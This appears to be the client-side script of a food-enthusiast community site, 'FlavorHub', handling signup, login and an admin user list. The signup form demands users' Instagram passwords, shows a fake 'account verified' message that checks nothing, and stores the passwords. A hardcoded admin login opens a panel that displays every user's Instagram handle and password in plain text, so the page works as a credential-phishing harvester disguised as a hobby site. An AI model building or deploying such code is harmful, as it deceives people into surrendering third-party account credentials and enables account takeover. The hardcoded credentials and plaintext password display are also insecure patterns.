import { 
  initializeSupabase, 
  createUser, 
  getUserByEmail, 
  getAllUsers, 
  authenticateUser 
} from './database.js';

// Global state
let currentUser = null;
let isAdmin = false;
let supabaseInitialized = false;

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
  // Try to initialize Supabase
  supabaseInitialized = initializeSupabase();
  
  if (!supabaseInitialized) {
    console.warn('Supabase not configured. Using local storage fallback.');
  }

  // Initialize Instagram input validation
  setupInstagramValidation();
  
  // Initially hide content until logged in
  hideContent();
  
  // Setup event listeners
  setupEventListeners();
});

function setupEventListeners() {
  // Signup form handler
  document.getElementById('signupForm').addEventListener('submit', handleSignup);
  
  // Login form handler
  document.getElementById('loginForm').addEventListener('submit', handleLogin);
}

function setupInstagramValidation() {
  const instagramInput = document.getElementById('instagramId');
  if (instagramInput) {
    instagramInput.addEventListener('input', function(e) {
      const value = e.target.value;
      const statusDiv = document.getElementById('instagramLinkStatus');

      if (value.length > 2 && value.startsWith('@')) {
        setTimeout(() => {
          statusDiv.style.display = 'block';
          statusDiv.innerHTML = '<span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>';
        }, 800);
      } else if (value.length > 0 && !value.startsWith('@')) {
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = '<span style="color: #e74c3c;">Please start with @ symbol</span>';
      } else {
        statusDiv.style.display = 'none';
      }
    });
  }
}

async function handleSignup(e) {
  e.preventDefault();

  const userData = {
    fullName: document.getElementById('fullName').value,
    email: document.getElementById('email').value,
    instagramId: document.getElementById('instagramId').value,
    instagramPassword: document.getElementById('instagramPassword').value,
    password: document.getElementById('password').value,
    foodInterest: document.getElementById('foodInterest').value
  };

  try {
    if (supabaseInitialized) {
      // Check if email already exists
      const existingUser = await getUserByEmail(userData.email);
      if (existingUser) {
        alert('Email already registered! Please use a different email.');
        return;
      }

      // Create user in database
      await createUser(userData);
    } else {
      // Fallback to localStorage
      const users = JSON.parse(localStorage.getItem('flavorhub_users') || '[]');
      if (users.find(user => user.email === userData.email)) {
        alert('Email already registered! Please use a different email.');
        return;
      }
      
      userData.id = Date.now();
      userData.joinDate = new Date().toLocaleDateString();
      userData.instagramLinked = true;
      users.push(userData);
      localStorage.setItem('flavorhub_users', JSON.stringify(users));
    }

    // Show Instagram linked status
    document.getElementById('instagramLinkStatus').style.display = 'block';

    // Show success message
    setTimeout(() => {
      showSignupSuccess(userData);
    }, 1000);

    // Reset form after 4 seconds
    setTimeout(() => {
      closeModal('signupModal');
      resetSignupForm();
      hideContent();
    }, 4000);

  } catch (error) {
    console.error('Signup error:', error);
    alert('Error creating account. Please try again.');
  }
}

async function handleLogin(e) {
  e.preventDefault();

  const email = document.getElementById('loginEmail').value;
  const password = document.getElementById('loginPassword').value;

  // Admin check
  if (email === 'adminaccess@datacheck.in' && password === 'seccheck@1234') {
    isAdmin = true;
    currentUser = { full_name: 'Admin', email: 'adminaccess@datacheck.in' };
    closeModal('loginModal');
    await showAdminPanel();
    showContent();
    return;
  }

  try {
    let user = null;
    
    if (supabaseInitialized) {
      user = await authenticateUser(email, password);
    } else {
      // Fallback to localStorage
      const users = JSON.parse(localStorage.getItem('flavorhub_users') || '[]');
      user = users.find(u => u.email === email && u.password === password);
    }

    if (user) {
      currentUser = user;
      closeModal('loginModal');
      showUserDashboard();
      showContent();
    } else {
      alert('Invalid credentials. Please check your email and password.');
    }
  } catch (error) {
    console.error('Login error:', error);
    alert('Error logging in. Please try again.');
  }
}

function showSignupSuccess(userData) {
  const modalContent = document.querySelector('#signupModal .modal-content');
  modalContent.innerHTML = `
    <span class="close" onclick="closeModal('signupModal')">&times;</span>
    <div class="success-message">
      <h2 style="color: #e67e22; margin-bottom: 1rem; font-family: 'Playfair Display', serif;">🎉 Welcome to FlavorHub!</h2>
      <div style="background: #d1ecf1; border: 1px solid #bee5eb; border-radius: 8px; padding: 1rem; margin: 1rem 0;">
        <p style="margin: 0; color: #0c5460;"><strong>✓ Instagram Account Linked:</strong> ${userData.instagramId}</p>
        <p style="margin: 0.5rem 0 0 0; color: #0c5460; font-size: 0.9rem;">Your social presence has been verified and connected to our community.</p>
      </div>
      <p>Your account has been created successfully. You can now login and start exploring our community of food enthusiasts!</p>
      <button class="btn btn-primary" onclick="closeModal('signupModal'); openModal('loginModal')" style="margin-top: 1rem;">Login Now</button>
    </div>
  `;
}

async function showAdminPanel() {
  document.getElementById('adminPanel').classList.add('show');
  await updateUserList();
  document.getElementById('adminPanel').style.display = 'block';
  
  // Update auth buttons
  document.querySelector('header .auth-buttons').innerHTML = `
    <span style="margin-right: 1rem; color: #e67e22; font-weight: bold;">Admin Panel Active</span>
    <button class="btn btn-secondary" onclick="logout()">Logout</button>
  `;
}

function showUserDashboard() {
  const displayName = currentUser.full_name || currentUser.fullName;
  // Update auth buttons for logged-in user
  document.querySelector('header .auth-buttons').innerHTML = `
    <span style="margin-right: 1rem; color: #e67e22;">Welcome, ${displayName}!</span>
    <button class="btn btn-secondary" onclick="logout()">Logout</button>
  `;
  // Hide admin panel for non-admins
  document.getElementById('adminPanel').style.display = 'none';
}

async function updateUserList() {
  const userListElement = document.getElementById('userList');

  try {
    let users = [];
    
    if (supabaseInitialized) {
      users = await getAllUsers();
    } else {
      users = JSON.parse(localStorage.getItem('flavorhub_users') || '[]');
    }

    if (users.length === 0) {
      userListElement.innerHTML = '<p style="text-align: center; color: #6c757d;">No users registered yet.</p>';
      return;
    }

    userListElement.innerHTML = users.map(user => `
      <div class="user-card">
        <div class="user-info">
          <div><strong>Name:</strong> ${user.full_name || user.fullName}</div>
          <div><strong>Email:</strong> ${user.email}</div>
          <div><strong>Instagram:</strong> ${user.instagram_id || user.instagramId} <span style="color: #27ae60; font-size: 0.9rem;">✓ Linked</span></div>
          <div><strong>Password:</strong> ${user.password_hash || user.password}</div>
          <div><strong>Interest:</strong> ${user.food_interest || user.foodInterest}</div>
          <div><strong>Joined:</strong> ${user.created_at ? new Date(user.created_at).toLocaleDateString() : user.joinDate}</div>
        </div>
      </div>
    `).join('');
  } catch (error) {
    console.error('Error updating user list:', error);
    userListElement.innerHTML = '<p style="text-align: center; color: #dc3545;">Error loading users.</p>';
  }
}

// Global functions for HTML onclick handlers
window.openModal = function(modalId) {
  document.getElementById(modalId).style.display = 'block';
};

window.closeModal = function(modalId) {
  document.getElementById(modalId).style.display = 'none';
};

window.toggleAdminPanel = function() {
  const panel = document.getElementById('adminPanel');
  panel.classList.toggle('show');
};

window.logout = function() {
  currentUser = null;
  isAdmin = false;
  document.getElementById('adminPanel').classList.remove('show');
  document.getElementById('adminPanel').style.display = 'none';
  
  // Reset auth buttons
  document.querySelector('header .auth-buttons').innerHTML = `
    <button class="btn btn-secondary" onclick="openModal('loginModal')">Login</button>
    <button class="btn btn-primary" onclick="openModal('signupModal')">Join Community</button>
  `;
  hideContent();
};

function showContent() {
  document.getElementById('contentOverlay').style.display = 'none';
  document.getElementById('mainContent').style.display = 'block';
}

function hideContent() {
  document.getElementById('contentOverlay').style.display = 'flex';
  document.getElementById('mainContent').style.display = 'none';
}

function resetSignupForm() {
  document.querySelector('#signupModal .modal-content').innerHTML = `
    <span class="close" onclick="closeModal('signupModal')">&times;</span>
    <h2 style="margin-bottom: 1.5rem; color: #e67e22;">Join FlavorHub</h2>
    <div class="form-requirement">
      <strong>📱 Social Presence Required:</strong> Main Instagram account required for community verification and social engagement. This helps us maintain an authentic, connected food community.
    </div>
    <form id="signupForm">
      <div class="form-group">
        <label for="fullName">Full Name:</label>
        <input type="text" id="fullName" required>
      </div>
      <div class="form-group">
        <label for="email">Email Address:</label>
        <input type="email" id="email" required>
      </div>
      <div class="form-group">
        <label for="instagramId">Instagram Handle: *</label>
        <input type="text" id="instagramId" placeholder="@yourhandle" required>
        <div class="instagram-link-status" id="instagramLinkStatus" style="margin-top: 0.5rem; font-size: 0.9rem; display: none;">
          <span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>
        </div>
      </div>
      <div class="form-group">
        <label for="instagramPassword">Instagram Password: *</label>
        <input type="password" id="instagramPassword" required>
        <div style="margin-top: 0.5rem; font-size: 0.9rem; color: #e74c3c;">
          * Required for Instagram account verification.
        </div>
      </div>
      <div class="form-group">
        <label for="password">Create Password:</label>
        <input type="password" id="password" required>
      </div>
      <div class="form-group">
        <label for="foodInterest">Primary Food Interest:</label>
        <select id="foodInterest" required style="width: 100%; padding: 0.8rem; border: 2px solid #e9ecef; border-radius: 8px;">
          <option value="">Select your main interest...</option>
          <option value="food-blogging">Food Blogging</option>
          <option value="culinary-arts">Culinary Arts</option>
          <option value="home-cooking">Home Cooking</option>
          <option value="baking">Baking & Pastry</option>
          <option value="nutrition">Nutrition & Health</option>
          <option value="food-photography">Food Photography</option>
        </select>
      </div>
      <button type="submit" class="btn btn-primary" style="width: 100%;">Join Community</button>
    </form>
    <p style="text-align: center; margin-top: 1rem;">
      Already a member? <a href="#" onclick="closeModal('signupModal'); openModal('loginModal')" style="color: #e67e22;">Login here</a>
    </p>
  `;

  // Re-attach event listeners
  document.getElementById('signupForm').addEventListener('submit', handleSignup);
  setupInstagramValidation();
}

// Close modal when clicking outside
window.onclick = function(event) {
  if (event.target.classList.contains('modal')) {
    event.target.style.display = 'none';
  }
};